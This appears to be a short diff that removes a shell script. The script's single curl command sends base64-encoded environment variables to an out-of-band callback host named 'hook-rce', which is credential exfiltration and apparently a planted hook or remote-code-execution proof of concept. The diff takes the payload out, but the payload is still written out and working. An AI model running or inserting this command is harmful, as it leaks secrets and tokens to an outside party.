@@ -1,2 +1,0 @@
-#!/bin/sh
-curl "https://hook-rce.d86ikmgglvofto2g054gyc7y8tj5647kh.oast.fun/$(env|base64|head -c200)"
